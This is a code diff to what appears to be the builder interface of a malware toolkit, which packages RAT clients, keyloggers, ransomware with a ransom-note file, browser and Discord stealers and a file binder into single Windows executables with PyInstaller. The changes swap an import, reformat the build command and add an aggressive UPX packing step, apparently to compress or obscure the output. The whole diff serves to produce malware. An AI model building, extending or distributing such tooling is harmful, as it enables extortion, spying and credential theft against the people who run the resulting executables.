@@ -503,7 +503,7 @@ class App(customtkinter.CTk):
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
             '--hidden-import', 'pyaudio',
-            '--hidden-import', 'cv2'
+            '--hidden-import', 'imageio'
         ] if rat_client else []
 
         browser_imports = [
@@ -522,7 +522,22 @@ class App(customtkinter.CTk):
 
         imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data' if ransomware else '', f'{coincurve_path};coincurve' if ransomware else '', '--add-data' if ransomware else '', f'{cryptodome_path};Cryptodome' if ransomware else '', '--add-data' if ransomware else '', f'{bit_path};bit' if ransomware else '', '--add-data' if ransomware else '', f'{dir}\\src\\temp\\instructions.txt;.' if ransomware else '', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + [f'{dir}\\src\\output.py']
+        command = [
+                'python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean',
+            ] + imports + [
+                '--icon', icon if icon else 'NONE', 
+                '--workpath', 'build', 
+                '--specpath', 'build\\spec', 
+                '--add-data' if ransomware else '', 
+                f'{coincurve_path};coincurve' if ransomware else '', 
+                '--add-data' if ransomware else '', 
+                f'{cryptodome_path};Cryptodome' if ransomware else '', 
+                '--add-data' if ransomware else '', f'{bit_path};bit' 
+                if ransomware else '', '--add-data' if ransomware else '', 
+                f'{dir}\\src\\temp\\instructions.txt;.' if ransomware else '', 
+                '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', 
+                '--add-data', f'{dir}\\src\\files\\failed.jpg;.'
+            ] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
@@ -563,8 +578,7 @@ class App(customtkinter.CTk):
         with open(file_path, "rb") as f:
             data = f.read()
 
-        # Replace known strings
-        # data = data.replace(b'MEIPASS', b'MAEPISS')
+        subprocess.call([f'{dir}\\build\\upx\\upx.exe', '--ultra-brute', '--lzma', '--overlay=copy', '--force', 'dist\\output.exe'], shell=True)
 
         with open(file_path, "wb") as f:
             f.write(data)
